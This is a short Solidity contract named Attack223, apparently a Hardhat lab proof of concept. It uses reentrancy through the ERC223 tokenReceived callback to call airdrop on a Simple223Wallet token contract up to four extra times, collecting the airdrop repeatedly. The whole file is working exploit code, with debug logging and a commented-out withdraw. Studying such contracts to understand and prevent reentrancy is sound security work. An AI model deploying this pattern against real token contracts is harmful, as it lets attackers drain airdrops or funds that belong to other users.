// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./utils/IERC223Recipient.sol";
import "hardhat/console.sol";

import "./Simple223Token.sol";

contract Attack223 is IERC223Recipient {
    Simple223Wallet public tokenAddress;
    address public owner;

    address att = address(this);

    uint i = 0;


    constructor(address _tokenAddress) {
        tokenAddress = Simple223Wallet(_tokenAddress);
        owner = msg.sender;
    }

    function tokenReceived(
        address _from,
        uint256 _value,
        bytes memory _data
    ) public override {
        // attack
        if (i < 4) {
            console.log("attack",i);
            i ++;
            tokenAddress.airdrop(address(this));
        }
    }

    function exp() public {
        tokenAddress.airdrop(address(this));
        console.log(tokenAddress.balanceOf(address(this)));
//        tokenAddress.withdraw(100);
    }
}
